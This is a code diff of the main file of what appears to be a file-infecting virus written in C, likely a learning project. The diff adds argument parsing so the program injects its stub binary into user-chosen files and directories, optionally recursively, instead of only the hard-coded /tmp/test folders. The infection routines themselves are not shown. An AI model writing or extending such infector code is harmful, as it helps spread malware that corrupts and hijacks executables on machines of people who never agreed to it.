@@ -28,8 +28,8 @@ void _start();
 
 int main(void) {
 	size_t offset = (uintptr_t)&placeholders - (uintptr_t)&_start;
-	infect_dir("/tmp/test", (void*)&_start, placeholders.stub_len, offset);
-	infect_dir("/tmp/test2", (void*)&_start, placeholders.stub_len, offset);
+	infect_dir("/tmp/test", (void*)&_start, placeholders.stub_len, offset, 0);
+	infect_dir("/tmp/test2", (void*)&_start, placeholders.stub_len, offset, 0);
 	LOG("done\n");
 	LOG("placeholder offset: %zu\n", offset);
 	return (0);
@@ -37,15 +37,56 @@ int main(void) {
 
 #else
 
-int main(void) {
+t_args parse_args(int argc, char **argv) {
+	t_args args = {0};
+	args.recursive = 0;
+	for (int i = 1; i < argc; i++)
+	{
+		if (argv[i][0] != '-')
+			break;
+		else if (strcmp(argv[i], "--help") == 0)
+		{
+			// TODO: make a nice usage output
+			exit(0);
+		}
+		else if (strcmp(argv[i], "-r") == 0)
+			args.recursive = 1;
+	}
+	return (args);
+}
+
+int main(int argc, char **argv) {
+	t_args args;
+
+	args = parse_args(argc, argv);
 	void *site = memmem(stub_bin, stub_bin_len, (void*)&placeholders.entry, sizeof(placeholders.entry));
 	if (site == NULL) {
 		LOG("Placeholders not found\n");
 		return (1);
 	}
 	size_t offset = (uintptr_t)site - (uintptr_t)stub_bin - offsetof(struct placeholders, entry);
-	infect_dir("/tmp/test", stub_bin, stub_bin_len, offset);
-	infect_dir("/tmp/test2", stub_bin, stub_bin_len, offset);
+	if (argc > 1)
+	{
+		int i = 1;
+		while (i < argc)
+		{
+			if (argv[i][0] == '-')
+			{
+				i++;
+				continue ;
+			}
+			if (argv[i][strlen(argv[i]) - 1] == '/')
+				infect_dir(argv[i], stub_bin, stub_bin_len, offset, args.recursive);
+			else
+				infect_file(argv[i], stub_bin, stub_bin_len, offset);
+			i++;
+		}
+	}
+	else
+	{
+		infect_dir("/tmp/test", stub_bin, stub_bin_len, offset, 0);
+		infect_dir("/tmp/test2", stub_bin, stub_bin_len, offset, 0);
+	}
 	LOG("done\n");
 
 	return (0);
